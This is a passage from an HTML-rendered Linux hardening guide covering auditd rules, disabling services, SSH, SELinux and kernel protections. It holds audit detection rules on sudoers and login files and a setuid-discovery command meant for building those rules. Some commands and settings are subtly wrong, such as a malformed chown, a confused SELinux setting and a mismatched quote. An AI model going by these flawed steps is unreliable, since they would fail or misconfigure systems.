class=\"nt\">-F</span> <span class=\"nb\">arch</span><span class=\"o\">=</span>b32 <span class=\"nt\">-S</span> removexattr <span class=\"nt\">-F</span> auid&gt;<span class=\"o\">=</span>500 <span class=\"nt\">-F</span> auid!<span class=\"o\">=</span>4294967295 <span class=\"nt\">-k</span> perm_mod\n<span class=\"nt\">-a</span> always,exit <span class=\"nt\">-F</span> <span class=\"nb\">arch</span><span class=\"o\">=</span>b64 <span class=\"nt\">-S</span> removexattr <span class=\"nt\">-F</span> auid&gt;<span class=\"o\">=</span>500 <span class=\"nt\">-F</span> auid!<span class=\"o\">=</span>4294967295 <span class=\"nt\">-k</span> perm_mod-a always,exit <span class=\"nt\">-F</span> <span class=\"nb\">arch</span><span class=\"o\">=</span>b32 <span class=\"nt\">-S</span> fchmodat <span class=\"nt\">-F</span> auid&gt;<span class=\"o\">=</span>500 <span class=\"nt\">-F</span> auid!<span class=\"o\">=</span>4294967295 <span class=\"nt\">-k</span> perm_mod\n<span class=\"nt\">-a</span> always,exit <span class=\"nt\">-F</span> <span class=\"nb\">arch</span><span class=\"o\">=</span>b64 <span class=\"nt\">-S</span> fchmodat <span class=\"nt\">-F</span> auid&gt;<span class=\"o\">=</span>500 <span class=\"nt\">-F</span> auid!<span class=\"o\">=</span>4294967295 <span class=\"nt\">-k</span> perm_mod\n\n<span class=\"c\">#Record Events that Modify the System's Discretionary Access Controls - fchown</span>\n<span class=\"nt\">-a</span> always,exit <span class=\"nt\">-F</span> <span class=\"nb\">arch</span><span class=\"o\">=</span>b32 <span class=\"nt\">-S</span> fchown <span class=\"nt\">-F</span> auid&gt;<span class=\"o\">=</span>500 <span class=\"nt\">-F</span> auid!<span class=\"o\">=</span>4294967295 <span class=\"nt\">-k</span> perm_mod\n<span class=\"nt\">-a</span> always,exit <span class=\"nt\">-F</span> <span class=\"nb\">arch</span><span class=\"o\">=</span>b64 <span class=\"nt\">-S</span> fchown <span class=\"nt\">-F</span> auid&gt;<span class=\"o\">=</span>500 <span class=\"nt\">-F</span> auid!<span class=\"o\">=</span>4294967295 <span class=\"nt\">-k</span> perm_mod\n\n<span class=\"c\">#Record Events that Modify the System's Discretionary Access Controls - fchownat</span>\n<span class=\"nt\">-a</span> always,exit <span class=\"nt\">-F</span> <span class=\"nb\">arch</span><span class=\"o\">=</span>b32 <span class=\"nt\">-S</span> fchownat <span class=\"nt\">-F</span> auid&gt;<span class=\"o\">=</span>500 <span class=\"nt\">-F</span> auid!<span class=\"o\">=</span>4294967295 <span class=\"nt\">-k</span> perm_mod\n<span class=\"nt\">-a</span> always,exit <span class=\"nt\">-F</span> <span class=\"nb\">arch</span><span class=\"o\">=</span>b64 <span class=\"nt\">-S</span> fchownat <span class=\"nt\">-F</span> auid&gt;<span class=\"o\">=</span>500 <span class=\"nt\">-F</span> auid!<span class=\"o\">=</span>4294967295 <span class=\"nt\">-k</span> perm_mod\n\n<span class=\"c\">#Record Events that Modify the System's Discretionary Access Controls - fremovexattr</span>\n<span class=\"nt\">-a</span> always,exit <span class=\"nt\">-F</span> <span class=\"nb\">arch</span><span class=\"o\">=</span>b32 <span class=\"nt\">-S</span> fremovexattr <span class=\"nt\">-F</span> auid&gt;<span class=\"o\">=</span>500 <span class=\"nt\">-F</span> auid!<span class=\"o\">=</span>4294967295 <span class=\"nt\">-k</span> perm_mod\n<span class=\"nt\">-a</span> always,exit <span class=\"nt\">-F</span> <span class=\"nb\">arch</span><span class=\"o\">=</span>b64 <span class=\"nt\">-S</span> fremovexattr <span class=\"nt\">-F</span> auid&gt;<span class=\"o\">=</span>500 <span class=\"nt\">-F</span> auid!<span class=\"o\">=</span>4294967295 <span class=\"nt\">-k</span> perm_mod\n\n<span class=\"c\">#Record Events that Modify the System's Discretionary Access Controls - fsetxattr</span>\n<span class=\"nt\">-a</span> always,exit <span class=\"nt\">-F</span> <span class=\"nb\">arch</span><span class=\"o\">=</span>b32 <span class=\"nt\">-S</span> lsetxattr <span class=\"nt\">-F</span> auid&gt;<span class=\"o\">=</span>500 <span class=\"nt\">-F</span> auid!<span class=\"o\">=</span>4294967295 <span class=\"nt\">-k</span> perm_mod\n<span class=\"nt\">-a</span> always,exit <span class=\"nt\">-F</span> <span class=\"nb\">arch</span><span class=\"o\">=</span>b64 <span class=\"nt\">-S</span> lsetxattr <span class=\"nt\">-F</span> auid&gt;<span class=\"o\">=</span>500 <span class=\"nt\">-F</span> auid!<span class=\"o\">=</span>4294967295 <span class=\"nt\">-k</span> perm_mod\n\n<span class=\"c\">#Record Events that Modify the System's Discretionary Access Controls - removexattr</span>\n<span class=\"nt\">-a</span> always,exit <span class=\"nt\">-F</span> <span class=\"nb\">arch</span><span class=\"o\">=</span>b32 <span class=\"nt\">-S</span> removexattr <span class=\"nt\">-F</span> auid&gt;<span class=\"o\">=</span>500 <span class=\"nt\">-F</span> auid!<span class=\"o\">=</span>4294967295 <span class=\"nt\">-k</span> perm_mod\n<span class=\"nt\">-a</span> always,exit <span class=\"nt\">-F</span> <span class=\"nb\">arch</span><span class=\"o\">=</span>b64 <span class=\"nt\">-S</span> removexattr <span class=\"nt\">-F</span> auid&gt;<span class=\"o\">=</span>500 <span class=\"nt\">-F</span> auid!<span class=\"o\">=</span>4294967295 <span class=\"nt\">-k</span> perm_mod\n\n<span class=\"c\">#Record Events that Modify the System's Discretionary Access Controls - setxattr</span>\n<span class=\"nt\">-a</span> always,exit <span class=\"nt\">-F</span> <span class=\"nb\">arch</span><span class=\"o\">=</span>b32 <span class=\"nt\">-S</span> setxattr <span class=\"nt\">-F</span> auid&gt;<span class=\"o\">=</span>500 <span class=\"nt\">-F</span> auid!<span class=\"o\">=</span>4294967295 <span class=\"nt\">-k</span> perm_mod\n<span class=\"nt\">-a</span> always,exit <span class=\"nt\">-F</span> <span class=\"nb\">arch</span><span class=\"o\">=</span>b64 <span class=\"nt\">-S</span> setxattr <span class=\"nt\">-F</span> auid&gt;<span class=\"o\">=</span>500 <span class=\"nt\">-F</span> auid!<span class=\"o\">=</span>4294967295 <span class=\"nt\">-k</span> perm_mod\n\n<span class=\"c\">#Record Attempts to Alter Logon and Logout Events</span>\n<span class=\"nt\">-w</span> /var/log/faillog <span class=\"nt\">-p</span> wa <span class=\"nt\">-k</span> logins\n<span class=\"nt\">-w</span> /var/log/lastlog <span class=\"nt\">-p</span> wa <span class=\"nt\">-k</span> logins\n\n<span class=\"c\">#Record Attempts to Alter Process and Session Initiation Information</span>\n<span class=\"nt\">-w</span> /var/run/utmp <span class=\"nt\">-p</span> wa <span class=\"nt\">-k</span> session\n<span class=\"nt\">-w</span> /var/log/btmp <span class=\"nt\">-p</span> wa <span class=\"nt\">-k</span> session\n<span class=\"nt\">-w</span> /var/log/wtmp <span class=\"nt\">-p</span> wa <span class=\"nt\">-k</span> session\n\n<span class=\"c\">#Ensure auditd Collects Unauthorized Access Attempts to Files (unsuccessful)</span>\n<span class=\"nt\">-a</span> always,exit <span class=\"nt\">-F</span> <span class=\"nb\">arch</span><span class=\"o\">=</span>b32 <span class=\"nt\">-S</span> creat <span class=\"nt\">-S</span> open <span class=\"nt\">-S</span> openat <span class=\"nt\">-S</span> open_by_handle_at <span class=\"nt\">-S</span> <span class=\"nb\">truncate</span> <span class=\"nt\">-S</span> ftruncate <span class=\"nt\">-F</span> <span class=\"nb\">exit</span><span class=\"o\">=</span><span class=\"nt\">-EACCES</span> <span class=\"nt\">-F</span> auid&gt;<span class=\"o\">=</span>500 <span class=\"nt\">-F</span> auid!<span class=\"o\">=</span>4294967295 <span class=\"nt\">-k</span> access\n<span class=\"nt\">-a</span> always,exit <span class=\"nt\">-F</span> <span class=\"nb\">arch</span><span class=\"o\">=</span>b32 <span class=\"nt\">-S</span> creat <span class=\"nt\">-S</span> open <span class=\"nt\">-S</span> openat <span class=\"nt\">-S</span> open_by_handle_at <span class=\"nt\">-S</span> <span class=\"nb\">truncate</span> <span class=\"nt\">-S</span> ftruncate <span class=\"nt\">-F</span> <span class=\"nb\">exit</span><span class=\"o\">=</span><span class=\"nt\">-EPERM</span> <span class=\"nt\">-F</span> auid&gt;<span class=\"o\">=</span>500 <span class=\"nt\">-F</span> auid!<span class=\"o\">=</span>4294967295 <span class=\"nt\">-k</span> access\n<span class=\"nt\">-a</span> always,exit <span class=\"nt\">-F</span> <span class=\"nb\">arch</span><span class=\"o\">=</span>b64 <span class=\"nt\">-S</span> creat <span class=\"nt\">-S</span> open <span class=\"nt\">-S</span> openat <span class=\"nt\">-S</span> open_by_handle_at <span class=\"nt\">-S</span> <span class=\"nb\">truncate</span> <span class=\"nt\">-S</span> ftruncate <span class=\"nt\">-F</span> <span class=\"nb\">exit</span><span class=\"o\">=</span><span class=\"nt\">-EACCES</span> <span class=\"nt\">-F</span> auid&gt;<span class=\"o\">=</span>500 <span class=\"nt\">-F</span> auid!<span class=\"o\">=</span>4294967295 <span class=\"nt\">-k</span> access\n<span class=\"nt\">-a</span> always,exit <span class=\"nt\">-F</span> <span class=\"nb\">arch</span><span class=\"o\">=</span>b64 <span class=\"nt\">-S</span> creat <span class=\"nt\">-S</span> open <span class=\"nt\">-S</span> openat <span class=\"nt\">-S</span> open_by_handle_at <span class=\"nt\">-S</span> <span class=\"nb\">truncate</span> <span class=\"nt\">-S</span> ftruncate <span class=\"nt\">-F</span> <span class=\"nb\">exit</span><span class=\"o\">=</span><span class=\"nt\">-EPERM</span> <span class=\"nt\">-F</span> auid&gt;<span class=\"o\">=</span>500 <span class=\"nt\">-F</span> auid!<span class=\"o\">=</span>4294967295 <span class=\"nt\">-k</span> access\n\n<span class=\"c\">#Ensure auditd Collects Information on the Use of Privileged Commands</span>\n<span class=\"c\">#</span>\n<span class=\"c\">#  Find setuid / setgid programs then modify and uncomment the line below.</span>\n<span class=\"c\">#</span>\n<span class=\"c\">##  sudo find / -xdev -type f -perm -4000 -o -perm -2000 2&gt;/dev/null</span>\n<span class=\"c\">#</span>\n<span class=\"c\"># -a always,exit -F path=SETUID_PROG_PATH -F perm=x -F auid&gt;=500 -F auid!=4294967295 -k privileged</span>\n\n<span class=\"c\">#Ensure auditd Collects Information on Exporting to Media (successful)</span>\n<span class=\"nt\">-a</span> always,exit <span class=\"nt\">-F</span> <span class=\"nb\">arch</span><span class=\"o\">=</span>ARCH <span class=\"nt\">-S</span> mount <span class=\"nt\">-F</span> auid&gt;<span class=\"o\">=</span>500 <span class=\"nt\">-F</span> auid!<span class=\"o\">=</span>4294967295 <span class=\"nt\">-k</span> <span class=\"nb\">export</span>\n\n<span class=\"c\">#Ensure auditd Collects File Deletion Events by User</span>\n<span class=\"nt\">-a</span> always,exit <span class=\"nt\">-F</span> <span class=\"nb\">arch</span><span class=\"o\">=</span>ARCH <span class=\"nt\">-S</span> <span class=\"nb\">rmdir</span> <span class=\"nt\">-S</span> <span class=\"nb\">unlink</span> <span class=\"nt\">-S</span> unlinkat <span class=\"nt\">-S</span> rename <span class=\"nt\">-S</span> renameat <span class=\"nt\">-F</span> auid&gt;<span class=\"o\">=</span>500 <span class=\"nt\">-F</span> auid!<span class=\"o\">=</span>4294967295 <span class=\"nt\">-k</span> delete\n\n<span class=\"c\">#Ensure auditd Collects System Administrator Actions</span>\n<span class=\"nt\">-w</span> /etc/sudoers <span class=\"nt\">-p</span> wa <span class=\"nt\">-k</span> actions\n\n<span class=\"c\">#Ensure auditd Collects Information on Kernel Module Loading and Unloading</span>\n<span class=\"nt\">-w</span> /sbin/insmod <span class=\"nt\">-p</span> x <span class=\"nt\">-k</span> modules\n<span class=\"nt\">-w</span> /sbin/rmmod <span class=\"nt\">-p</span> x <span class=\"nt\">-k</span> modules\n<span class=\"nt\">-w</span> /sbin/modprobe <span class=\"nt\">-p</span> x <span class=\"nt\">-k</span> modules\n<span class=\"nt\">-a</span> always,exit <span class=\"nt\">-F</span> <span class=\"nb\">arch</span><span class=\"o\">=</span>b64 <span class=\"nt\">-S</span> init_module <span class=\"nt\">-S</span> delete_module <span class=\"nt\">-k</span> modules\n\n<span class=\"c\">#Make the auditd Configuration Immutable</span>\n<span class=\"nt\">-e</span> 2</code></pre> \n</figure> \n<p>##Removal of Unrequired Services</p> \n<p>The section outlines software that should be removed, instruction for disabling the service is also documented.</p> \n<h3 id=\"bulk-remove-of-services\">Bulk Remove of Services</h3> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\"><span class=\"c\"># Remove</span>\nyum remove xinetd\nyum remove telnet-server\nyum remove rsh-server\nyum remove telnet\nyum remove rsh-server\nyum remove rsh\nyum remove ypbind\nyum remove ypserv\nyum remove tftp-server\nyum remove cronie-anacron\nyum remove <span class=\"nb\">bind\n</span>yum remove vsftpd\nyum remove httpd\nyum remove dovecot\nyum remove squid\nyum remove net-snmpd</code></pre> \n</figure> \n<h3 id=\"bulk-enable--disable-services\">Bulk Enable / Disable Services</h3> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\"><span class=\"c\">#Disable / Enable</span>\nsystemctl disable xinetd\nsystemctl disable rexec\nsystemctl disable rsh\nsystemctl disable rlogin\nsystemctl disable ypbind\nsystemctl disable tftp\nsystemctl disable certmonger\nsystemctl disable cgconfig\nsystemctl disable cgred\nsystemctl disable cpuspeed\nsystemctl <span class=\"nb\">enable </span>irqbalance\nsystemctl disable kdump\nsystemctl disable mdmonitor\nsystemctl disable messagebus\nsystemctl disable netconsole\nsystemctl disable ntpdate\nsystemctl disable oddjobd\nsystemctl disable portreserve\nsystemctl <span class=\"nb\">enable </span>psacct\nsystemctl disable qpidd\nsystemctl disable quota_nld\nsystemctl disable rdisc\nsystemctl disable rhnsd\nsystemctl disable rhsmcertd\nsystemctl disable saslauthd\nsystemctl disable smartd\nsystemctl disable sysstat\nsystemctl <span class=\"nb\">enable </span>crond\nsystemctl disable atd\nsystemctl disable nfslock\nsystemctl disable named\nsystemctl disable httpd\nsystemctl disable dovecot\nsystemctl disable squid\nsystemctl disable snmpd</code></pre> \n</figure> \n<h3 id=\"disable-secure-rpc-client-service\">Disable Secure RPC Client Service</h3> \n<p>Disable rpcgssd:</p> \n<p>The rpcgssd service manages RPCSEC GSS contexts required to secure protocols that use RPC (most often Kerberos and NFS). The rpcgssd service is the client-side of RPCSEC GSS. If the system does not require secure RPC then this service should be disabled. The rpcgssd service can be disabled with the following command:</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\">systemctl disable rpcgssd</code></pre> \n</figure> \n<h3 id=\"disable-secure-rpc-server-service\">Disable Secure RPC Server Service</h3> \n<p>Disable rpcsvcgssd:</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\">systemctl disable rpcsvcgssd</code></pre> \n</figure> \n<h3 id=\"disable-rpc-id-mapping-service\">Disable RPC ID Mapping Service</h3> \n<p>Disable rpcidmapd.</p> \n<p>The rpcidmapd service is used to map user names and groups to UID and GID numbers on NFSv4 mounts. If NFS is not in use on the local system then this service should be disabled. The rpcidmapd service can be disabled with the following command:</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\">systemctl disable rpcidmapd</code></pre> \n</figure> \n<h3 id=\"disable-network-file-systems-netfs\">Disable Network File Systems (netfs)</h3> \n<p>The netfs script manages the boot-time mounting of several types of networked filesystems, of which NFS and Samba are the most common. If these filesystem types are not in use, the script can be disabled, protecting the system somewhat against accidental or malicious changes to /etc/fstab and against flaws in the netfs script itself. The netfs service can be disabled with the following command:</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\"><span class=\"nb\">sudo </span>systemctl disable netfs</code></pre> \n</figure> \n<h3 id=\"disable-network-file-system-nfs\">Disable Network File System (nfs)</h3> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\">systemctl disable nfs</code></pre> \n</figure> \n<h3 id=\"if-you-dont-need-ssh-disable-it\">If you don’t need SSH disable it</h3> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\">systemctl disable sshd</code></pre> \n</figure> \n<h3 id=\"disable-ssh-iptables-firewall-rule\">Disable SSH iptables Firewall rule</h3> \n<p>Only do this if you don’t need SSH.</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\"><span class=\"nt\">-A</span> INPUT <span class=\"nt\">-m</span> state <span class=\"nt\">--state</span> NEW <span class=\"nt\">-m</span> tcp <span class=\"nt\">-p</span> tcp <span class=\"nt\">--dport</span> 22 <span class=\"nt\">-j</span> ACCEPT</code></pre> \n</figure> \n<div class=\"note\"> \n <h5>Tips™ - You probable need to leave SSH alone</h5> \n <p>Unless you know you don't need SSH, leave SSH and it's iptables rule enabled.</p> \n</div> \n<p>###Remove Rsh Trust Files</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\"><span class=\"nb\">rm</span> /etc/hosts.equiv\n<span class=\"nb\">rm</span> ~/.rhosts</code></pre> \n</figure> \n<h3 id=\"disable-avahi-server-software\">Disable Avahi Server Software</h3> \n<p>The avahi-daemon service can be disabled with the following command:</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\">systemctl disable avahi-daemon</code></pre> \n</figure> \n<h3 id=\"disable-the-cups-service\">Disable the CUPS Service</h3> \n<p>If you don’t need CUPS, disable it to further reduce your attack surface:</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\">systemctl disable cups</code></pre> \n</figure> \n<h3 id=\"disable-dhcp-service\">Disable DHCP Service</h3> \n<p>The dhcpd service should be disabled on any system that does not need to act as a DHCP server.</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\">systemctl disable dhcpd</code></pre> \n</figure> \n<h3 id=\"uninstall-dhcp-server-package\">Uninstall DHCP Server Package</h3> \n<p>If you don’t need a DHCP client, remove it:</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\">yum erase dhcp</code></pre> \n</figure> \n<h3 id=\"disable-dhcp-client\">Disable DHCP Client</h3> \n<p>Open <code>/etc/sysconfig/network-scripts/ifcfg-eth0</code> (if you have more interfaces, do this for each one) and make sure the address is statically assigned with the BOOTPROTO=none</p> \n<p>Example:</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\"><span class=\"nv\">BOOTPROTO</span><span class=\"o\">=</span>none\n\n<span class=\"nv\">NETMASK</span><span class=\"o\">=</span>255.255.255.0\n<span class=\"nv\">IPADDR</span><span class=\"o\">=</span>192.168.1.2\n<span class=\"nv\">GATEWAY</span><span class=\"o\">=</span>192.168.1.1</code></pre> \n</figure> \n<h3 id=\"specify-additional-remote-ntp-servers\">Specify Additional Remote NTP Servers</h3> \n<p>Open <code>/etc/ntp.conf</code> and add the following line:</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\">server ntpserver</code></pre> \n</figure> \n<p>Use an internal NTP server if possible.</p> \n<h3 id=\"enable-postfix\">Enable Postfix</h3> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\">systemctl <span class=\"nb\">enable </span>postfix</code></pre> \n</figure> \n<h3 id=\"remove-sendmail\">Remove Sendmail</h3> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\">yum remove sendmail</code></pre> \n</figure> \n<h3 id=\"postfix-disable-network-listening\">Postfix Disable Network Listening</h3> \n<p>Open, <code>/etc/postfix/main.cf</code> and ensure the following inet_interfaces line appears:</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\">inet_interfaces <span class=\"o\">=</span> localhost</code></pre> \n</figure> \n<h3 id=\"configure-smtp-greeting-banner\">Configure SMTP Greeting Banner</h3> \n<p>Change the greeting banner, the default banner discloses the SMTP server is Postfix.</p> \n<h3 id=\"disable-xinetd-service\">Disable xinetd Service</h3> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\"><span class=\"nb\">sudo </span>systemctl disable xinetd</code></pre> \n</figure> \n<h3 id=\"system-audit-logs-permissions\">System Audit Logs Permissions</h3> \n<p>System audit logs must have 0640 or less permissions set.</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\"><span class=\"nb\">sudo chmod </span>0640 audit_file</code></pre> \n</figure> \n<h3 id=\"system-audit-logs-must-be-owned-by-root\">System Audit Logs Must Be Owned By Root</h3> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\"><span class=\"nb\">sudo chown </span>root/var/log</code></pre> \n</figure> \n<h3 id=\"disable-autofs\">Disable autofs</h3> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\">chkconfig <span class=\"nt\">--level</span> 0123456 autofs off\nservice autofs stop</code></pre> \n</figure> \n<h2 id=\"disable-uncommon-filesystems\">Disable uncommon filesystems</h2> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\"><span class=\"nb\">echo</span> <span class=\"s2\">\"install cramfs /bin/false\"</span> <span class=\"o\">&gt;</span> /etc/modprobe.d/cramfs.conf\n<span class=\"nb\">echo</span> <span class=\"s2\">\"install freevxfs /bin/false\"</span> <span class=\"o\">&gt;</span> /etc/modprobe.d/freevxfs.conf\n<span class=\"nb\">echo</span> <span class=\"s2\">\"install jffs2 /bin/false\"</span> <span class=\"o\">&gt;</span> /etc/modprobe.d/jffs2.conf\n<span class=\"nb\">echo</span> <span class=\"s2\">\"install hfs /bin/false\"</span> <span class=\"o\">&gt;</span> /etc/modprobe.d/hfs.conf\n<span class=\"nb\">echo</span> <span class=\"s2\">\"install hfsplus /bin/false\"</span> <span class=\"o\">&gt;</span> /etc/modprobe.d/hfsplus.conf\n<span class=\"nb\">echo</span> <span class=\"s2\">\"install squashfs /bin/false\"</span> <span class=\"o\">&gt;</span> /etc/modprobe.d/squashfs.conf\n<span class=\"nb\">echo</span> <span class=\"s2\">\"install udf /bin/false\"</span> <span class=\"o\">&gt;</span> /etc/modprobe.d/udf.conf</code></pre> \n</figure> \n<h2 id=\"disable-core-dumps-for-all-users\">Disable core dumps for all users</h2> \n<p><code>vi /etc/security/limits.conf</code></p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\"><span class=\"k\">*</span> hard core 0</code></pre> \n</figure> \n<h2 id=\"disable-core-dumps-for-suid-programs\">Disable core dumps for SUID programs</h2> \n<p>Run <code>sysctl -w fs.suid_dumpable=0</code> and <code>fs.suid_dumpable = 0</code>.</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\"><span class=\"c\"># Set runtime for fs.suid_dumpable</span>\n<span class=\"c\">#</span>\nsysctl <span class=\"nt\">-q</span> <span class=\"nt\">-n</span> <span class=\"nt\">-w</span> fs.suid_dumpable<span class=\"o\">=</span>0\n\n<span class=\"c\">#</span>\n<span class=\"c\"># If fs.suid_dumpable present in /etc/sysctl.conf, change value to \"0\"</span>\n<span class=\"c\">#     else, add \"fs.suid_dumpable = 0\" to /etc/sysctl.conf</span>\n<span class=\"c\">#</span>\n<span class=\"k\">if </span><span class=\"nb\">grep</span> <span class=\"nt\">--silent</span> ^fs.suid_dumpable /etc/sysctl.conf <span class=\"p\">;</span> <span class=\"k\">then\n     </span><span class=\"nb\">sed</span> <span class=\"nt\">-i</span> <span class=\"s1\">'s/^fs.suid_dumpable.*/fs.suid_dumpable = 0/g'</span> /etc/sysctl.conf\n<span class=\"k\">else\n     </span><span class=\"nb\">echo</span> <span class=\"s2\">\"\"</span> <span class=\"o\">&gt;&gt;</span> /etc/sysctl.conf\n     <span class=\"nb\">echo</span> <span class=\"s2\">\"# Set fs.suid_dumpable to 0 per security requirements\"</span> <span class=\"o\">&gt;&gt;</span> /etc/sysctl.conf\n     <span class=\"nb\">echo</span> <span class=\"s2\">\"fs.suid_dumpable = 0\"</span> <span class=\"o\">&gt;&gt;</span> /etc/sysctl.conf\n<span class=\"k\">fi</span></code></pre> \n</figure> \n<h2 id=\"buffer-overflow-protection\">Buffer Overflow Protection</h2> \n<p>This section helps mitigate against Buffer Overflow attacks (BOF).</p> \n<h3 id=\"enable-execshield\">Enable ExecShield</h3> \n<p>Helps prevent stack smashing / BOF.</p> \n<p>Enable on current kernel: <code>sysctl -w kernel.exec-shield=1</code></p> \n<p>Add to /etc/sysctl.conf:</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\">kernel.exec-shield <span class=\"o\">=</span> 1</code></pre> \n</figure> \n<h3 id=\"check--enable-aslr\">Check / Enable ASLR</h3> \n<p>Set runtime for kernel.randomize_va_space <code>sysctl -q -n -w kernel.randomize_va_space=2</code></p> \n<p>Add <code>kernel.randomize_va_space = 2</code> to /etc/sysctl.conf if it does not already exist.</p> \n<h3 id=\"enable-xd-or-nx-support-on-x86-systems\">Enable XD or NX Support on x86 Systems</h3> \n<p>Recent processors in the x86 family support the ability to prevent code execution on a per memory page basis. Generically and on AMD processors, this ability is called <strong>No Execute (NX)</strong>, while on Intel processors it is called <strong>Execute Disable (XD)</strong>. This ability can help prevent exploitation of buffer overflow vulnerabilities and should be activated whenever possible. Extra steps must be taken to ensure that this protection is enabled, particularly on 32-bit x86 systems. Other processors, such as Itanium and POWER, have included such support since inception and the standard kernel for those platforms supports the feature.</p> \n<p>Check bios and ensure XD/NX is enabled, not relevant for VM’s.</p> \n<h2 id=\"selinux\">SELinux</h2> \n<h3 id=\"confirm-selinux-is-not-disabled\">Confirm SELinux is not disabled</h3> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\"><span class=\"nb\">sed</span> <span class=\"nt\">-i</span> <span class=\"s2\">\"s/selinux=0//gI\"</span> /etc/grub.conf\n<span class=\"nb\">sed</span> <span class=\"nt\">-i</span> <span class=\"s2\">\"s/enforcing=0//gI\"</span> /etc/grub.conf</code></pre> \n</figure> \n<h3 id=\"selinux-targeted--enforcing\">SELinux Targeted / Enforcing</h3> \n<p>Open /etc/selinux/config and check for <code>SELINUXTYPE=targeted</code> or <code>SELINUXTYPE=enforcing</code>, depending on your requirements.</p> \n<h3 id=\"enable-the-selinux-restorecond-service\">Enable the SELinux restorecond Service</h3> \n<p>The restorecond service utilizes inotify to look for the creation of new files listed in the /etc/selinux/restorecond.conf configuration file. When a file is created, restorecond ensures the file receives the proper SELinux security context. The restorecond service can be enabled with the following command:</p> \n<p>Enable restorecond for all run levels:</p> \n<p><code>chkconfig --level 0123456 restorecond on</code></p> \n<p>Start restorecond if not currently running:</p> \n<p><code>service restorecond start</code></p> \n<h3 id=\"check-no-daemons-are-unconfined-by-selinux\">Check no daemons are unconfined by SELinux</h3> \n<p>Run:</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\"><span class=\"nb\">sudo </span>ps <span class=\"nt\">-eZ</span> | egrep <span class=\"s2\">\"initrc\"</span> | egrep <span class=\"nt\">-vw</span> <span class=\"s2\">\"tr|ps|egrep|bash|awk\"</span> | <span class=\"nb\">tr</span> <span class=\"s1\">':'</span> <span class=\"s1\">' '</span> | <span class=\"nb\">awk</span> <span class=\"s1\">'{ print $NF }’</span></code></pre> \n</figure> \n<p>This should return no output.</p> \n<h2 id=\"prevent-log-in-to-accounts-with-empty-password\">Prevent Log In to Accounts With Empty Password</h2> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\"><span class=\"nb\">sed</span> <span class=\"nt\">-i</span> <span class=\"s1\">'s/\\&lt;nullok\\&gt;//g'</span> /etc/pam.d/system-auth</code></pre> \n</figure> \n<h2 id=\"secure-ssh\">Secure SSH</h2> \n<h3 id=\"allow-only-ssh-protocol-2\">Allow Only SSH Protocol 2</h3> \n<p>Open <code>/etc/ssh/sshd_config</code> and ensure the following line exists:</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\">Protocol 2</code></pre> \n</figure> \n<h3 id=\"limit-users-ssh-access\">Limit Users’ SSH Access</h3> \n<p>Open <code>/etc/ssh/sshd_config</code> and add:</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\">DenyUsers USER1 USER2</code></pre> \n</figure> \n<h3 id=\"set-ssh-idle-timeout-interval\">Set SSH Idle Timeout Interval</h3> \n<p>To set an idle timeout interval, edit the following line in <code>/etc/ssh/sshd_config</code> as follows:</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\">ClientAliveInterval interval</code></pre> \n</figure> \n<h3 id=\"set-ssh-client-alive-count\">Set SSH Client Alive Count</h3> \n<p>To ensure the SSH idle timeout occurs precisely when the ClientAliveCountMax is set, edit <code>/etc/ssh/sshd_config</code> as follows:</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\">ClientAliveCountMax 0</code></pre> \n</figure> \n<h3 id=\"disable-ssh-support-for-rhosts-files\">Disable SSH Support for .rhosts Files</h3> \n<p>SSH can emulate the behavior of the obsolete rsh command in allowing users to enable insecure access to their accounts via .rhosts files.</p> \n<p>To ensure this behavior is disabled, add or correct the following line in <code>/etc/ssh/sshd_config</code>:</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\">IgnoreRhosts <span class=\"nb\">yes</span></code></pre> \n</figure> \n<h3 id=\"disable-host-based-authentication\">Disable Host-Based Authentication</h3> \n<p>SSH’s cryptographic host-based authentication is more secure than .rhosts authentication. However, it is not recommended that hosts unilaterally trust one another, even within an organization.</p> \n<p>To disable host-based authentication, add or correct the following line in 